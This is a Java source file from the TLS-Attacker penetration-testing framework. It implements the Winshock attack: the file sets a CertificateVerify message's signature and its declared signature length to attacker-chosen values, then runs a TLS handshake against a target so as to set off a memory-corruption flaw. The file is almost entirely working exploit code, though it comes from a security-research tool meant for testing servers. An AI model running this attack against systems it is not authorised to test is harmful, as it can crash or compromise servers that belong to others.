/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2016 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.WinshockCommandConfig;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.modifiablevariable.integer.IntegerModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.integer.ModifiableInteger;
import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.tls.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.tls.protocol.message.CertificateVerifyMessage;
import de.rub.nds.tlsattacker.tls.workflow.TlsConfig;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import de.rub.nds.tlsattacker.util.ArrayConverter;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Allows to execute the Winshock attack, by setting the CertificateVerify
 * protocol message properties. I
 *
 * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
 */
public class WinshockAttacker extends Attacker<WinshockCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(WinshockAttacker.class);

    public WinshockAttacker(WinshockCommandConfig config) {
        super(config, false);
    }

    @Override
    public void executeAttack() {
        TlsConfig tlsConfig = config.createConfig();
        tlsConfig.setClientAuthentication(true);
        TlsContext tlsContext = new TlsContext(tlsConfig);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getExecutorType(),
                tlsContext);

        WorkflowTrace trace = tlsContext.getWorkflowTrace();

        ModifiableByteArray signature = new ModifiableByteArray();
        signature.setModification(ByteArrayModificationFactory.explicitValue(ArrayConverter
                .bigIntegerToByteArray(config.getSignature())));

        ModifiableInteger signatureLength = new ModifiableInteger();
        if (config.getSignatureLength() == null) {
            signatureLength.setModification(IntegerModificationFactory.explicitValue(signature.getValue().length));
        } else {
            signatureLength.setModification(IntegerModificationFactory.explicitValue(config.getSignatureLength()));
        }

        CertificateVerifyMessage cvm = (CertificateVerifyMessage) trace
                .getFirstConfiguredSendMessageOfType(HandshakeMessageType.CERTIFICATE_VERIFY);
        cvm.setSignature(signature);
        cvm.setSignatureLength(signatureLength);

        workflowExecutor.executeWorkflow();
    }

    @Override
    public Boolean isVulnerable() {
        throw new UnsupportedOperationException("Not implemented yet");
    }
}
